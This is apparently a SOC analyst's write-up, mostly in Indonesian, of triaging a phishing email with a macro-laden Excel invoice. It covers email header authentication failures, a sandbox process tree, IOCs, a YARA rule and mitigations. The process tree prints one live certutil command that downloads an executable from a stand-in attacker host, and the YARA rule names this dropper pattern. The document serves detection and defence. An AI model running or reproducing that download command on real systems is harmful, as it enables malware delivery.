# Project Write-Up: Spear-Phishing Triage & Header Analysis

- **Role Focus:** SOC Analyst Tier 1 / Email Security / Threat Intelligence
- **Target Techniques (MITRE ATT&CK):**
  - `T1566.001` - Spearphishing Attachment
  - `T1059.005` - Visual Basic for Applications (VBA Macro)
  - `T1105` - Ingress Tool Transfer (certutil / powershell)
- **Tools Used:** ANY.RUN Sandbox, VirusTotal, Sublime Text, CyberChef, YARA

---

## 1. Incident Overview
Tiket laporan diterima dari departemen Keuangan terkait email mencurigakan bertajuk *"Urgent: Unpaid Invoice #INV-9921 - Action Required"*. Email tersebut melampirkan berkas spreadsheet bernama `Invoice_Corporate_9921.xlsm`.

Tugas SOC Analyst Tier 1:
1. Memvalidasi keaslian pengirim (Autentikasi Header Email).
2. Mengekstrak dan menganalisis artifak berbahaya (*Indicators of Compromise* / IOC).
3. Detonasi berkas di sandbox terisolasi.
4. Menerbitkan aturan pemblokiran YARA / SIEM.

---

## 2. Analisis Header Email (.eml)

Header email mentah dianalisis menggunakan teks editor untuk memeriksa parameter autentikasi:

```
From: "Billing Dept" <billing@legit-vendor.com>
Reply-To: <collector-service@evil-domains.ru>
Return-Path: <bounce-daemon@evil-domains.ru>
Received: from mail.evil-domains.ru (185.220.101.5) by mx.target-corp.com
Authentication-Results: mx.target-corp.com;
  spf=fail (sender IP 185.220.101.5 not authorized for legit-vendor.com);
  dkim=none;
  dmarc=fail (p=quarantine)
```

**Temuan Analis:**
- **Spoofing Display Name:** Alamat `From` menampilkan domain vendor yang sah, namun alamat pengirim sebenarnya berasal dari IP `185.220.101.5`.
- **SPF & DMARC Failure:** Server pengirim gagal lolos verifikasi SPF karena IP pengirim tidak ada di catatan SPF DNS milik `legit-vendor.com`.

---

## 3. Ekstraksi IOC & Detonasi Sandbox (ANY.RUN)

Berkas lampiran `Invoice_Corporate_9921.xlsm` diunggah ke lingkungan interaktif ANY.RUN:

1. **Macro Execution:** Saat file dibuka dan macro diizinkan, script VBA `Auto_Open()` langsung memicu perintah tersembunyi.
2. **Process Tree Behavior:**
   ```
   EXCEL.EXE (PID 3120)
     └── cmd.exe /c "certutil.exe -urlcache -split -f http://evil-cdn.xyz/update.exe C:\Users\Public\update.exe"
           └── update.exe (PID 4412) -> Mencoba koneksi keluar ke 185.220.101.5:8080
   ```
3. **Defanged IOCs:**
   - **File Hash (SHA256):** `a7c1e36f9202a0194883f3e9b1d2e1b9c3e4125890e0b3c8a91b29aef1038bc2`
   - **Malicious URL:** `hxxp[://]evil-cdn[.]xyz/update[.]exe`
   - **C2 IP Address:** `185[.]220[.]101[.]5:8080`

---

## 4. Deteksi Berbasis YARA Rule

Dibuat aturan YARA untuk mendeteksi varian macro Excel yang memanfaatkan `certutil.exe` untuk pengunduhan biner:

```yara
rule Suspicious_Excel_Certutil_Dropper {
  meta:
    description = "Mendeteksi berkas Excel ber-macro yang memanggil certutil untuk download payload"
    author = "SOC Analyst Tier 1"
    date = "2026-10-03"
    reference = "INCIDENT-PHISH-092"
  strings:
    $doc_type = { 50 4B 03 04 } // PK ZIP header (xlsm)
    $macro_str1 = "Auto_Open" ascii nocase
    $macro_str2 = "Workbook_Open" ascii nocase
    $cmd = "cmd.exe" ascii nocase
    $certutil = "certutil" ascii nocase
    $urlcache = "-urlcache" ascii nocase
  condition:
    $doc_type at 0 and ($macro_str1 or $macro_str2) and ($cmd or $certutil) and $urlcache
}
```

---

## 5. Rekomendasi Mitigasi
- Blokir domain `evil-cdn.xyz` dan IP `185.220.101.5` pada proxy web dan perimeter firewall.
- Jalankan purge/penghapusan email serupa dari kotak surat pengguna di Microsoft 365 / Google Workspace.
- Nonaktifkan eksekusi macro pada Microsoft Office bagi seluruh workstation yang tidak membutuhkan fungsi tersebut via Active Directory GPO.
